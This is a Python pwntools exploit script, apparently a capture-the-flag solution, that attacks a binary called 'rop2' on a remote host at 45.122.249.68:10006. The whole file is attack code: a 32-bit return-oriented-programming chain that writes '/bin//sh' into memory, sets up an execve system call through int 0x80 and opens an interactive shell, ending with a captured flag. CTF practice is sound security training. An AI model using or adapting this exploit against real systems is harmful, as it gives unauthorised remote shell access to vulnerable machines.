from pwn import *

local = 0

if local:
	s = process('./rop2')
	debug = gdb.attach(s, gdbscript='''
		b*0x080488d5
		b*0x080488DC
		c
	''')
else:
	s = remote('45.122.249.68', 10006)

payload = b'A' * 0x1c

payload += p32(0x0806ee6b) # pop edx ; ret
payload += p32(0x080da060) # @ .data
#payload += p32(0x080a8e36) # pop eax ; ret
payload += p32(0x08049708) # pop esi ; ret
payload += b'/bin'
payload += p32(0x080581d0) # mov eax, esi ; pop ebx ; pop esi ; pop edi ; ret
payload += p32(0x00000000)
payload += p32(0x00000000)
payload += p32(0x00000000)
payload += p32(0x08056e65) # mov dword ptr [edx], eax ; ret
payload += p32(0x0806ee6b) # pop edx ; ret
payload += p32(0x080da064) # @ .data + 4
#payload += p32(0x080a8e36) # pop eax ; ret
payload += p32(0x08049708) # pop esi ; ret
payload += b'//sh'
payload += p32(0x080581d0) # mov eax, esi ; pop ebx ; pop esi ; pop edi ; ret
payload += p32(0x00000000)
payload += p32(0x00000000)
payload += p32(0x00000000)
payload += p32(0x08056e65) # mov dword ptr [edx], eax ; ret
payload += p32(0x0806ee6b) # pop edx ; ret
payload += p32(0x080da068) # @ .data + 8
payload += p32(0x08056420) # xor eax, eax ; ret
payload += p32(0x08056e65) # mov dword ptr [edx], eax ; ret
payload += p32(0x080481c9) # pop ebx ; ret
payload += p32(0x080da060) # @ .data
payload += p32(0x0806ee92) # pop ecx ; pop ebx ; ret
payload += p32(0x080da068) # @ .data + 8
payload += p32(0x080da060) # padding without overwrite ebx
payload += p32(0x0806ee6b) # pop edx ; ret
payload += p32(0x080da068) # @ .data + 8
payload += p32(0x08056420) # xor eax, eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x08049563) # int 0x80

s.sendline(payload)

s.interactive()
#flag{73022499164268983362}
